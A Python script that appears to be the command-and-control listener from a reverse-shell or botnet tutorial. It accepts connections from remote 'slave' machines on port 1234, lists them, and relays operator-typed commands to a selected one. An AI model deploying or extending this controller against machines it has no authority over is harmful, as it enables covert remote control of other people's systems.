import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_address = []

flag_msg = False

# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 1234
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port)+"\n")
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


def accepting_connection():
	for c in all_connections:
		c.close()

	del all_connections[:]
	del all_address[:]

	while True:
		try:
			conn, address = s.accept()
			s.setblocking(1) #Prevents Timeout
			all_connections.append(conn)
			all_address.append(address)
			print("[ New Slave ] [ IP : ", address[0] , " ] [ PORT : " , address[1] , " ]")
		except socket.error as msg:
			print("Error Accepting Connections: "+msg)

def start_menu():
	while True:
		server_input = input("> ")
		if (server_input=='list'):
			list_slaves()
		elif('select' in server_input):
			conn = get_slave(server_input)
			print
			if (conn is not None):
				send_msg_to_slave(conn)
		else:
			print("[ Command not found ]")

def list_slaves():
	results = ""
	for i, conn in enumerate(all_connections):
		try:
			conn.send(str.encode("ping"))
			conn.recv(201480)
		except:
			del all_connections[i]
			del all_address[i]
			continue

		results = results + str(i) + " " + str(all_address[i][0]) + " " + str(all_address[i][1]) + "\n"
	print("---- SLAVES ----" + "\n" + results)

def get_slave(server_input):
	try:
		slave_id = server_input.replace('select ','')
		slave_id = int(slave_id)
		conn = all_connections[slave_id]
		print("[ Connected to "+ str(all_address[slave_id][0]) +" ]")
		print(str(all_address[slave_id][0]) + ">",end="")
		return conn
	except:
		print("[NOT VALID ID]")
		return None

def send_msg_to_slave(conn):
	while True:
		try:
			msg = input("")
			if msg == "quit":
				break
			if len(str.encode(msg)) > 0:
				conn.send(str.encode(msg))
				
		except:
			print("[Error sending msg to Slave]")

def start_threads():
	for _ in range(NUMBER_OF_THREADS):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()

def work():
	while True:
		x = queue.get()
		if x==1:
			create_socket()
			bind_socket()
			accepting_connection()
		if x==2:
			start_menu()
		queue.task_done()

def create_jobs():
	for x in JOB_NUMBER:
		queue.put(x);
	queue.join()

start_threads()
create_jobs()